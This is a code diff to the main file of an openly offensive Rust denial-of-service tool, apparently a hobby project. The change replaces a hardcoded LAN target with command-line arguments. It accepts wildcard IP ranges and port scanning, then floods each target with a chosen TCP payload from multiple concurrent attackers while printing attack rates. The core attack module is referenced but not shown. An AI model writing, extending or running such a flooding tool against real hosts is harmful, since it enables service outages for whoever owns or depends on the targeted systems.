@@ -1,15 +1,19 @@
 use crate::dos::Attacker;
 use crate::rust_scan::port_strategy::SerialRange;
 use crate::rust_scan::{PortRange, PortStrategy, ScanOrder};
+use crate::args::*;
 use futures::prelude::*;
 use rust_scan::Scanner;
 use std::borrow::BorrowMut;
+use std::net::*;
 use std::net::{IpAddr, Ipv4Addr};
 use std::sync::Arc;
 use std::thread::sleep;
 use std::time::Duration;
 use std::{io, thread, time};
-use std::net::*;
+use atomic_counter::*;
+use futures::stream::FuturesUnordered;
+use rayon::prelude::*;
 
 #[macro_use]
 extern crate tokio;
@@ -23,11 +27,11 @@ extern crate log;
 
 mod dos;
 mod rust_scan;
+mod args;
 
-use atomic_counter::*;
-use futures::stream::FuturesUnordered;
-use rayon::prelude::*;
-
+/**
+ * Prints the number of per second after "threshold" of attacks.
+ */
 fn print_counter(counter: Arc<dyn AtomicCounter<PrimitiveType = usize>>, threshold: usize) {
     let mut prints_done: usize = 0;
     let mut previous_time = time::SystemTime::now();
@@ -43,7 +47,8 @@ fn print_counter(counter: Arc<dyn AtomicCounter<PrimitiveType = usize>>, thresho
                     / (time::SystemTime::now()
                         .duration_since(previous_time)
                         .unwrap()
-                        .as_micros() as f64 / 1e6)
+                        .as_micros() as f64
+                        / 1e6)
             );
 
             previous_count = val;
@@ -53,44 +58,45 @@ fn print_counter(counter: Arc<dyn AtomicCounter<PrimitiveType = usize>>, thresho
     }
 }
 
+
+fn print_help() {
+    println!("Denile of service script implemented in Rust.");
+    println!("");
+    println!("Usage: hacking_dev [IPS] ");
+    println!("");
+    println!("IPs:    List of IP addresses with port to attack for ");
+    println!("        example: 1.1.1.1:8080,127.0.0.1:22. Numbers in the address can be ");
+    println!("        replaced with a * to try all 256 variants, a * for the por means it ");
+    println!("        should be scanned with RustScan. If no IP address was specified the ");
+    println!("        program will not run.");
+    println!("");
+    println!("Options: ");
+    println!("    -p | --payload              TCP message that is send to the target");
+    println!("    -h | --help                 Print this text and exit.");
+}
+
 #[tokio::main(flavor = "multi_thread", worker_threads = 4)]
-// #[tokio::main()]
 async fn main() {
+    let args = parse_cmd_args().await;
+    if args.help {
+        print_help();
+        return;
+    }
+
     let attack_counter: Arc<dyn AtomicCounter<PrimitiveType = usize>> =
         Arc::new(RelaxedCounter::new(0));
 
-    // let scanner = Scanner::new(
-    //     &[IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0))],
-    //     16,
-    //     Duration::from_millis(50),
-    //     32,
-    //     false,
-    //     PortStrategy::pick(
-    //         &Some(PortRange {
-    //             start: 500,
-    //             end: 10000,
-    //         }),
-    //         None,
-    //         ScanOrder::Serial,
-    //     ),
-    //     false,
-    // );
-    //
-    // let ports = scanner.run().await;
-    //
-    let ports = [SocketAddr::V4(SocketAddrV4::new(Ipv4Addr::new(192,168,1,64), 8080))];
-    println!("Attacking addresses: {:#?}", ports);
-    let attackers = ports.iter().map(|addr| {
+    println!("Attacking addresses: {:#?}", args.addresses);
+    let attackers = args.addresses.iter().map(|addr| {
         Attacker::new(
             *addr,
-            Vec::from("CREATE TABLE test"),
+            args.payload.clone(),
             16,
             attack_counter.clone(),
         )
     });
-    
 
-    // sleep(Duration::from_secs(10));
+    // run counter on other thread
     let counter_print = attack_counter.clone();
     let _handler = thread::spawn(move || print_counter(counter_print, 50000));
 
@@ -119,10 +125,4 @@ async fn main() {
     }
 
     println!("Attacking done");
-    // for attack in attackers {
-    //     match attack {
-    //         Ok(a) => a.run().await.unwrap(),
-    //         Err(errors) => error!("{}", errors),
-    //     }
-    // }
 }
